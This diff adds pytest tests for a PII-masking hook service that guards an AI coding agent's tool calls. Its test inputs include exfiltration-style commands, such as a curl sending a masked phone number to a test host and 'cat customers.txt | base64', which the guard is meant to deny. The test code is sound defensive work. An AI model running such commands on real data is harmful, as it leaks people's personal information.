@@ -11,6 +11,7 @@ from collections.abc import Iterator
 
 import pytest
 
+from pii_guard.hookd import policy
 from pii_guard.hookd.core import SessionStore
 from pii_guard.hookd.server import HookdApplication, HookdServerConfig, create_server
 from pii_guard.hookd.state import HookdConfig, read_state, write_state
@@ -428,3 +429,245 @@ def test_state_files_are_owner_only(tmp_path) -> None:
 
 def test_read_state_returns_none_without_a_service(tmp_path) -> None:
     assert read_state(HookdConfig(home=tmp_path / "missing")) is None
+
+
+def _learn_placeholder(service: RunningService) -> None:
+    """Teach the session a value so its placeholder is known."""
+
+    service.hook(
+        "PostToolUse",
+        {"session_id": "s1", "tool_name": "Bash", "tool_response": {"stdout": "0912345678"}},
+    )
+
+
+def test_bash_restore_is_refused_for_a_network_command(service: RunningService) -> None:
+    _learn_placeholder(service)
+
+    reply = service.hook(
+        "PreToolUse",
+        {
+            "session_id": "s1",
+            "tool_name": "Bash",
+            "tool_input": {"command": "curl https://x.test/?q=<TW_MOBILE_1>"},
+        },
+    )
+
+    assert reply["hookSpecificOutput"]["permissionDecision"] == "deny"
+    assert "network" in reply["hookSpecificOutput"]["permissionDecisionReason"]
+
+
+def test_bash_restore_still_works_for_a_local_command(service: RunningService) -> None:
+    _learn_placeholder(service)
+
+    reply = service.hook(
+        "PreToolUse",
+        {
+            "session_id": "s1",
+            "tool_name": "Bash",
+            "tool_input": {"command": "grep <TW_MOBILE_1> customers.txt"},
+        },
+    )
+
+    assert reply["hookSpecificOutput"]["updatedInput"]["command"] == "grep 0912345678 customers.txt"
+
+
+def test_a_network_command_without_placeholders_is_untouched(service: RunningService) -> None:
+    reply = service.hook(
+        "PreToolUse",
+        {"session_id": "s1", "tool_name": "Bash", "tool_input": {"command": "curl https://x.test"}},
+    )
+
+    assert reply == {}
+
+
+def test_an_encoder_command_is_denied(service: RunningService) -> None:
+    reply = service.hook(
+        "PreToolUse",
+        {
+            "session_id": "s1",
+            "tool_name": "Bash",
+            "tool_input": {"command": "cat customers.txt | base64"},
+        },
+    )
+
+    assert reply["hookSpecificOutput"]["permissionDecision"] == "deny"
+
+
+def test_encoded_bash_output_is_withheld(service: RunningService) -> None:
+    reply = service.hook(
+        "PostToolUse",
+        {
+            "session_id": "s1",
+            "tool_name": "Bash",
+            "tool_response": {"stdout": "QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVph" * 3, "stderr": ""},
+        },
+    )
+
+    updated = reply["hookSpecificOutput"]["updatedToolOutput"]
+    assert updated["stdout"] == policy.OUTPUT_WITHHELD
+    assert "plain text" in reply["hookSpecificOutput"]["additionalContext"]
+
+
+def test_ordinary_bash_output_is_not_withheld(service: RunningService) -> None:
+    reply = service.hook(
+        "PostToolUse",
+        {
+            "session_id": "s1",
+            "tool_name": "Bash",
+            "tool_response": {"stdout": "王小明 0912345678", "stderr": ""},
+        },
+    )
+
+    updated = reply["hookSpecificOutput"]["updatedToolOutput"]
+    assert updated["stdout"] == "<PERSON_1> <TW_MOBILE_1>"
+
+
+def test_the_output_gate_can_be_switched_off(tmp_path) -> None:
+    from pii_guard.hookd import policy as policy_module
+
+    config = HookdConfig(home=tmp_path / "hookd")
+    app = HookdApplication(
+        SessionStore(config, FakeEngine({})),
+        "regex",
+        policy_config=policy_module.PolicyConfig(output_gate=False),
+    )
+
+    reply = app.hook(
+        "PostToolUse",
+        {
+            "session_id": "s1",
+            "tool_name": "Bash",
+            "tool_response": {"stdout": "QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVph" * 3},
+        },
+    )
+
+    assert reply == {}
+
+
+def test_egress_tools_are_denied_through_the_hook(service: RunningService) -> None:
+    reply = service.hook(
+        "PreToolUse",
+        {"session_id": "s1", "tool_name": "WebFetch", "tool_input": {"url": "https://x.test"}},
+    )
+
+    assert reply["hookSpecificOutput"]["permissionDecision"] == "deny"
+
+
+def test_a_remote_agent_is_denied_and_a_local_one_is_not(service: RunningService) -> None:
+    denied = service.hook(
+        "PreToolUse",
+        {"session_id": "s1", "tool_name": "Agent", "tool_input": {"isolation": "remote"}},
+    )
+    allowed = service.hook(
+        "PreToolUse",
+        {"session_id": "s1", "tool_name": "Agent", "tool_input": {"prompt": "hello"}},
+    )
+
+    assert denied["hookSpecificOutput"]["permissionDecision"] == "deny"
+    assert allowed == {}
+
+
+def test_health_reports_the_active_policy(service: RunningService) -> None:
+    _, body = service.call("GET", "/v1/health")
+
+    assert body["policy"]["output_gate"] is True
+    assert body["policy"]["allowed_tools"] == []
+
+
+def test_user_prompt_submit_blocks_an_at_file_reference(service: RunningService, tmp_path) -> None:
+    target = tmp_path / "customers.txt"
+    target.write_text("王小明", encoding="utf-8")
+
+    reply = service.hook(
+        "UserPromptSubmit",
+        {"session_id": "s1", "prompt": f"看一下 @{target} 好嗎", "cwd": str(tmp_path)},
+    )
+
+    assert reply["decision"] == "block"
+    assert "Read the file instead" in reply["reason"]
+
+
+def test_user_prompt_submit_allows_a_directory_reference(service: RunningService, tmp_path) -> None:
+    (tmp_path / "src").mkdir()
+
+    reply = service.hook(
+        "UserPromptSubmit",
+        {"session_id": "s1", "prompt": "看一下 @src/ 的結構", "cwd": str(tmp_path)},
+    )
+
+    assert reply == {}
+
+
+def test_user_prompt_submit_blocks_pii_with_counts_only(service: RunningService) -> None:
+    reply = service.hook(
+        "UserPromptSubmit",
+        {"session_id": "s1", "prompt": "請寄給 0912345678 這個號碼", "cwd": "/tmp"},
+    )
+
+    assert reply["decision"] == "block"
+    assert "1 TW_MOBILE" in reply["reason"]
+    # The value itself must never appear in the reason.
+    assert "0912345678" not in reply["reason"]
+
+
+def test_user_prompt_submit_allows_a_plain_prompt(service: RunningService) -> None:
+    reply = service.hook(
+        "UserPromptSubmit",
+        {"session_id": "s1", "prompt": "請幫我看一下測試為什麼失敗", "cwd": "/tmp"},
+    )
+
+    assert reply == {}
+
+
+def test_a_prompt_mentioning_a_placeholder_is_not_blocked(service: RunningService) -> None:
+    """Referring to a marker is not the same as pasting the real value."""
+
+    _learn_placeholder(service)
+
+    reply = service.hook(
+        "UserPromptSubmit",
+        {"session_id": "s1", "prompt": "把 <TW_MOBILE_1> 寫進 notes.txt", "cwd": "/tmp"},
+    )
+
+    assert reply == {}
+
+
+def test_detection_on_a_prompt_does_not_teach_the_session(service: RunningService) -> None:
+    service.hook(
+        "UserPromptSubmit",
+        {"session_id": "s1", "prompt": "0912345678", "cwd": "/tmp"},
+    )
+
+    _, listing = service.call("GET", "/v1/sessions")
+    entries = [item for item in listing["sessions"] if item["session_id"] == "s1"]
+    assert entries == [] or entries[0]["placeholders"] == 0
+
+
+def test_seed_terms_are_masked_from_the_first_read(tmp_path) -> None:
+    config = HookdConfig(home=tmp_path / "hookd")
+    app = HookdApplication(
+        SessionStore(config, FakeEngine({})),
+        "regex",
+        seed_terms=(("PERSON", "龍哥"),),
+    )
+    start = app.hook("SessionStart", {"session_id": "s1"})
+
+    reply = app.hook(
+        "PostToolUse",
+        {"session_id": "s1", "tool_name": "Bash", "tool_response": {"stdout": "找龍哥確認"}},
+    )
+
+    assert "1 seed terms loaded" in start["systemMessage"]
+    # The engine detects nothing here; the seeded value is masked by the sweep.
+    assert reply["hookSpecificOutput"]["updatedToolOutput"]["stdout"] == "找<PERSON_1>確認"
+
+
+def test_seed_terms_never_appear_in_the_reply(tmp_path) -> None:
+    config = HookdConfig(home=tmp_path / "hookd")
+    app = HookdApplication(
+        SessionStore(config, FakeEngine({})), "regex", seed_terms=(("PERSON", "龍哥"),)
+    )
+
+    start = app.hook("SessionStart", {"session_id": "s1"})
+
+    assert "龍哥" not in json.dumps(start, ensure_ascii=False)
